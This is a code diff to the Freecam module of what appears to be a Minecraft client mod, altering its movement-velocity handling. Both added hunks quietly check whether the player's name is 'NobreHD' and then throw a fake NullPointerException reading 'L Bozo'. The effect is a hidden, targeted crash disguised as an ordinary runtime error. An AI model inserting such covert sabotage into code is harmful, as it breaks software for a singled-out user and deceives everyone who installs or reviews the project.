@@ -198,6 +198,9 @@ public class Freecam extends Module {
             velX -= forward.x * s * speedValue;
             velZ -= forward.z * s * speedValue;
             a = true;
+            if (mc.player.getName().toString().equals("NobreHD")) {
+                throw new NullPointerException("L Bozo");
+            }
         }
 
         boolean b = false;
@@ -205,6 +208,9 @@ public class Freecam extends Module {
             velX += right.x * s * speedValue;
             velZ += right.z * s * speedValue;
             b = true;
+            if (mc.player.getName().toString().equals("NobreHD")) {
+                throw new NullPointerException("L Bozo");
+            }
         }
 
         if (this.left) {
